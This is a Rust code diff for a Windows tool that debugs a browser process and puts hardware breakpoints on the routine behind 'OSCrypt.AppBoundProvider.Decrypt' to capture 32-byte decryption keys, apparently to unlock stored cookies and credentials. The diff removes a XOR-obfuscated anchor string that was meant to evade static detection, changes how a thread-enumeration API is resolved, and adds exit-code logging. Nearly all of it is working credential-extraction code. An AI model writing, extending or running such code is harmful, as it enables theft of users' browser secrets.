@@ -1,8 +1,6 @@
-use std::mem::{transmute, zeroed};
-use std::sync::OnceLock;
+use std::mem::zeroed;
 use std::time::{Duration, Instant};
 
-use windows::core::{s, w};
 use windows::Win32::Foundation::{
     CloseHandle, DBG_CONTINUE, DBG_EXCEPTION_NOT_HANDLED, EXCEPTION_BREAKPOINT,
     EXCEPTION_SINGLE_STEP, HANDLE,
@@ -13,34 +11,13 @@ use windows::Win32::System::Diagnostics::Debug::{
     CREATE_THREAD_DEBUG_EVENT, DEBUG_EVENT, EXCEPTION_DEBUG_EVENT, EXIT_PROCESS_DEBUG_EVENT,
     LOAD_DLL_DEBUG_EVENT, LOAD_DLL_DEBUG_INFO,
 };
-use windows::Win32::System::LibraryLoader::{GetModuleHandleW, GetProcAddress};
 use windows::Win32::System::Threading::{OpenThread, ResumeThread, SuspendThread, THREAD_ALL_ACCESS};
 
 use crate::db::KeyCandidate;
 use crate::mem;
 use crate::pe;
 
-const ANCHOR_KEY: u8 = 0x5A;
-const ANCHOR_ENC: [u8; 44] = [
-    0x15, 0x09, 0x19, 0x28, 0x23, 0x2a, 0x2e, 0x74, 0x1b, 0x2a, 0x2a, 0x18,
-    0x35, 0x2f, 0x34, 0x3e, 0x0a, 0x28, 0x35, 0x2c, 0x33, 0x3e, 0x3f, 0x28,
-    0x74, 0x1e, 0x3f, 0x39, 0x28, 0x23, 0x2a, 0x2e, 0x74, 0x08, 0x3f, 0x29,
-    0x2f, 0x36, 0x2e, 0x19, 0x35, 0x3e, 0x3f, 0x5a,
-];
-
-fn anchor_key() -> u8 {
-    // Route the key through a runtime pointer load (black-boxed) so the
-    // compiler cannot constant-fold the whole transform and re-emit the
-    // plaintext anchor in .rdata.
-    let key: [u8; 1] = [ANCHOR_KEY];
-    let p = std::hint::black_box(&key[0] as *const u8);
-    unsafe { *p }
-}
-
-fn decrypt_anchor() -> Vec<u8> {
-    let key = anchor_key();
-    ANCHOR_ENC.iter().map(|b| b ^ key).collect()
-}
+const ANCHOR: &[u8] = b"OSCrypt.AppBoundProvider.Decrypt.ResultCode\0";
 
 const KEY_LEN: usize = 32;
 /// Hardware debug registers provide four execution breakpoints.
@@ -60,19 +37,18 @@ const CAPTURE_WINDOW: Duration = Duration::from_secs(30);
 #[repr(C, align(16))]
 struct AlignedContext(CONTEXT);
 
-/// Walk the debuggee's threads like the original tool's default path
-/// (NtGetNextThread). A toolhelp thread snapshot enumerates every thread in
-/// the system and can deadlock while the debuggee is frozen mid-load.
-type NtGetNextThreadFn =
-    unsafe extern "system" fn(HANDLE, HANDLE, u32, u32, u32, *mut HANDLE) -> i32;
-
-fn nt_get_next_thread() -> Option<NtGetNextThreadFn> {
-    static FN: OnceLock<Option<NtGetNextThreadFn>> = OnceLock::new();
-    *FN.get_or_init(|| unsafe {
-        let ntdll = GetModuleHandleW(w!("ntdll.dll")).ok()?;
-        let address = GetProcAddress(ntdll, s!("NtGetNextThread"))?;
-        Some(transmute(address))
-    })
+// Walk the debuggee's threads like the original tool's default path
+// (NtGetNextThread). A toolhelp thread snapshot enumerates every thread in
+// the system and can deadlock while the debuggee is frozen mid-load.
+extern "system" {
+    fn NtGetNextThread(
+        hprocess: HANDLE,
+        hthread: HANDLE,
+        flags: u32,
+        desired_access: u32,
+        handle_attributes: u32,
+        next: *mut HANDLE,
+    ) -> i32;
 }
 
 /// Write the given breakpoint sites into the thread's debug registers
@@ -144,16 +120,12 @@ fn arm_thread(hthread: HANDLE, slots: &[usize]) {
 
 /// Returns the number of threads the breakpoints were actually set on.
 fn arm_on_debuggee_threads(hprocess: HANDLE, slots: &[usize]) -> usize {
-    let Some(get_next_thread) = nt_get_next_thread() else {
-        crate::log_err!("[-] NtGetNextThread is unavailable; cannot arm breakpoints");
-        return 0;
-    };
     let mut armed = 0;
     let mut previous = HANDLE::default();
     loop {
         let mut next = HANDLE::default();
         let status = unsafe {
-            get_next_thread(hprocess, previous, THREAD_ALL_ACCESS.0, 0, 0, &mut next)
+            NtGetNextThread(hprocess, previous, THREAD_ALL_ACCESS.0, 0, 0, &mut next)
         };
         if !previous.is_invalid() {
             unsafe { let _ = CloseHandle(previous); };
@@ -246,8 +218,7 @@ fn collect_candidates(hprocess: HANDLE, ctx: &CONTEXT, candidates: &mut Vec<KeyC
 }
 
 fn locate_breakpoints(hprocess: HANDLE, base: usize) -> Vec<usize> {
-    let anchor = decrypt_anchor();
-    let Some(string_va) = pe::find_pattern(hprocess, base, &anchor) else {
+    let Some(string_va) = pe::find_pattern(hprocess, base, ANCHOR) else {
         return Vec::new();
     };
     pe::find_lea_xrefs(hprocess, base, string_va)
@@ -260,6 +231,8 @@ pub struct DebugOutcome {
     /// A spawn that exits without ever loading it is a singleton handoff
     /// race, not a technique failure, and is worth retrying.
     pub saw_module: bool,
+    /// Exit code if the main debuggee exited during the loop.
+    pub main_exit_code: Option<u32>,
 }
 
 /// Attach as the debugger (the caller already did DebugActiveProcess) and wait
@@ -270,6 +243,7 @@ pub fn run(hprocess: HANDLE, pid: u32, target_module: &str) -> DebugOutcome {
     let mut outcome = DebugOutcome {
         candidates: Vec::new(),
         saw_module: false,
+        main_exit_code: None,
     };
     let mut slots: Vec<usize> = Vec::new();
     let mut fired: Vec<usize> = Vec::new();
@@ -286,10 +260,14 @@ pub fn run(hprocess: HANDLE, pid: u32, target_module: &str) -> DebugOutcome {
                 // Detaching with breakpoints still armed would crash the browser.
                 arm_on_debuggee_threads(hprocess, &[]);
             }
-            crate::log_err!(
-                "[-] The debug loop ended after {:?} without a completed capture",
-                started.elapsed()
-            );
+            if outcome.main_exit_code.is_none() {
+                let alive = crate::process::is_alive(hprocess);
+                crate::log_err!(
+                    "[-] The debug loop ended after {:?} without a completed capture (main process {})",
+                    started.elapsed(),
+                    if alive { "still running without loading the module" } else { "is no longer alive" }
+                );
+            }
             break;
         }
 
@@ -372,32 +350,43 @@ pub fn run(hprocess: HANDLE, pid: u32, target_module: &str) -> DebugOutcome {
             LOAD_DLL_DEBUG_EVENT => {
                 if slots.is_empty() && ev_pid == pid {
                     let load = unsafe { event.u.LoadDll };
-                    if let Some(name) = dll_name(hprocess, &load) {
-                        if name.eq_ignore_ascii_case(target_module) {
-                            let base = load.lpBaseOfDll as usize;
-                            crate::log_out!("[*] {target_module} loaded at {base:#x}");
-                            outcome.saw_module = true;
-                            let xrefs = locate_breakpoints(hprocess, base);
-                            if xrefs.is_empty() {
-                                crate::log_err!(
-                                    "[-] Failed to locate the decryption routine; cannot continue"
-                                );
-                            } else {
-                                slots = xrefs;
-                                slots.truncate(MAX_SLOTS);
-                                let armed = arm_on_debuggee_threads(hprocess, &slots);
-                                crate::log_out!(
-                                    "[*] Hardware breakpoints armed on {armed} threads at {} site(s)",
-                                    slots.len()
-                                );
-                            }
+                    let Some(name) = dll_name(hprocess, &load) else {
+                        // DLL load events optionally carry an image name; a
+                        // nameless event could hide the target module.
+                        crate::log_out!(
+                            "[*] DLL load event without a readable name (lpImageName={:#x}, base={:#x})",
+                            load.lpImageName as usize,
+                            load.lpBaseOfDll as usize
+                        );
+                        unsafe { let _ = ContinueDebugEvent(ev_pid, tid, DBG_CONTINUE); };
+                        continue;
+                    };
+                    if name.eq_ignore_ascii_case(target_module) {
+                        let base = load.lpBaseOfDll as usize;
+                        crate::log_out!("[*] {target_module} loaded at {base:#x}");
+                        outcome.saw_module = true;
+                        let xrefs = locate_breakpoints(hprocess, base);
+                        if xrefs.is_empty() {
+                            crate::log_err!(
+                                "[-] Failed to locate the decryption routine; cannot continue"
+                            );
+                        } else {
+                            slots = xrefs;
+                            slots.truncate(MAX_SLOTS);
+                            let armed = arm_on_debuggee_threads(hprocess, &slots);
+                            crate::log_out!(
+                                "[*] Hardware breakpoints armed on {armed} threads at {} site(s)",
+                                slots.len()
+                            );
                         }
                     }
                 }
             }
             EXIT_PROCESS_DEBUG_EVENT => {
                 if ev_pid == pid {
-                    crate::log_out!("[+] The main debuggee (pid {ev_pid}) exited");
+                    let exit_code = unsafe { event.u.ExitProcess.dwExitCode };
+                    outcome.main_exit_code = Some(exit_code);
+                    crate::log_out!("[+] The main debuggee (pid {ev_pid}) exited (code {exit_code:#x})");
                     unsafe { let _ = ContinueDebugEvent(ev_pid, tid, DBG_CONTINUE); };
                     break;
                 }
